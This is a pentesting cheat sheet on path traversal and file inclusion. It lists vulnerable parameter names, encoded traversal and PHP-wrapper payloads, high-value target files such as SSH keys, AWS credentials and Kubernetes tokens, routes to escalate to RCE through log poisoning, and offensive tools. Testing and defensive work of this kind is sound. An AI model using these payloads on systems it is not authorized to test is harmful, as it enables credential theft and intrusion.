# Path Traversal / LFI / RFI

Read arbitrary files (secrets, source, `/etc/passwd`, cloud creds) and sometimes
escalate to RCE. Common in file-serving, template/include, download, and import
params. Read + reason; read only non-sensitive proof files.

## Where it lives

Params: `file, path, filename, page, template, include, doc, folder, download,
view, img, image, url, lang, dir, load, read, style, module, name`. Download/
export endpoints, "view attachment", i18n loaders, theme/template selectors,
avatar fetchers, log viewers.

## Payloads & bypasses

```
../../../../etc/passwd            ..\..\..\ (windows)  C:\windows\win.ini
....//....//etc/passwd            (nested — defeats single strip)
..%2f..%2f  ..%252f (double)  %2e%2e%2f  ..%c0%af  ..%ef%bc%8f (overlong/unicode)
/etc/passwd%00   ....//....//   (null byte on old PHP)
php://filter/convert.base64-encode/resource=index.php   (read source, PHP)
php://filter/read=string.rot13/resource=config.php
data://text/plain;base64,<b64>   expect://  (RFI/RCE, PHP wrappers)
file:///etc/passwd
absolute path (skip traversal): /etc/passwd, /proc/self/environ, /proc/self/cwd
```
Bypass "must start with allowed dir": `allowed/../../../etc/passwd`. Bypass
extension append (`.php` added): `%00`, path truncation, or target files without needing ext.

## High-value targets to read

`/etc/passwd`, `/proc/self/environ` (+ env secrets → RCE via LFI+log poisoning),
app source (`php://filter` base64), `.env`, `config.php`, `settings.py`,
`web.config`, `application.properties`, `~/.aws/credentials`, `~/.ssh/id_rsa`,
`/var/log/*` (log poisoning → RCE), k8s serviceaccount token
`/var/run/secrets/kubernetes.io/...`, cloud metadata files.

## Escalation to RCE

LFI + log poisoning (inject PHP into User-Agent → include the log), LFI + PHP
session files, LFI + `/proc/self/environ`, `php://filter` chains (PHP_FILTER RCE),
RFI where `allow_url_include=On`.

## Safe PoC

Read a non-sensitive file that proves traversal (`/etc/passwd` first line, or a
known static file outside the intended dir). Don't exfiltrate private keys/creds
in bulk — demonstrate access and stop.

## Tools

Caido/Burp Repeater, **LFISuite**/**dotdotpwn** (leads), `ffuf` with traversal
wordlist + `-mr root:` matcher, PayloadsAllTheThings traversal list, nuclei lfi templates.

## References (current)

- PortSwigger Web Security Academy — Path traversal.
- PayloadsAllTheThings — Directory Traversal / File Inclusion.
